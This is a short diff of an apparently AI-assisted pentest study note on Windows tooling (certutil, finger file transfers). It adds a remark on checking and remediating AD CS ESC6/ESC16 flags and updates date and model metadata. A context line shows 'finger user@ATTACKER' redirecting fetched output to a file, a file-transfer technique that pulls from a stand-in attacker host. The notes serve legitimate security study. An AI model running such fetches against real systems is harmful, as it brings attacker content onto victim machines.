@@ -143,10 +143,10 @@ finger user@ATTACKER | more +2 > C:\Temp\out.txt
 ```
 
 
-> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] (CPTS v2).
+> [!note] **See also** — [[Class notes/HTB Academy/CPTS v2 (claude)/Exploit & File Transfers|Exploit & File Transfers]] (CPTS v2). On a CA server it's also the AD CS admin/audit tool — `-getreg`/`-setreg` on `policy\EditFlags` and `policy\DisableExtensionList` confirm or remediate [[Services/Active Directory/ADCS|ADCS]] ESC6/ESC16.
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-07-31*
-*Model: claude-opus-5*
+*Updated: 2026-09-22*
+*Model: claude-opus-4-8*
